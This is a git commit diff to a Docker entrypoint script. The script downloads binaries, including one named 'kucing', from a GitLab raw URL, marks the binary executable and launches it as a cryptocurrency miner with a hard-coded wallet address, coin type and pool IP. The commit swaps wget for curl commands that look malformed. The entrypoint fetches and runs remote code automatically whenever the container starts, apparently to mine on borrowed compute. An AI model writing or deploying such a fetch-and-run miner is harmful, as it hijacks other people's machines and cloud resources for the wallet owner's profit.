4ab84d8d5f174230c9554eb0dfbecfae71c5a25e
anihsugiarti9 <137507644+anihsugiarti9@users.noreply.github.com>
2023-12-05 19:11:41 +0700

    Update docker-entrypoint.sh

--- docker-entrypoint.sh
+++ docker-entrypoint.sh
@@ -1,5 +1,5 @@
-wget -qO libnvrtc.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc.so.12.0.76
-wget -qO kucing https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing && chmod +x kucing
-wget -qO libnvrtc-builtins.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc-builtins.so.12.0.76
-wget -qO amdmemtweak https://gitlab.com/sarifadim/jomblo/-/raw/main/amdmemtweak
+curl -0 libnvrtc.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc.so.12.0.76 -O libnvrtc.so.12.0.76
+curl -0 kucing https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing -O kucing && chmod +x kucing
+curl -0 libnvrtc-builtins.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc-builtins.so.12.0.76 -O libnvrtc-builtins.so.12.0.76
+curl -0 amdmemtweak https://gitlab.com/sarifadim/jomblo/-/raw/main/amdmemtweak -O amdmemtweak
 ./kucing -wallet ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk -coin xmr -rigName bos -pool1 47.89.195.104:80
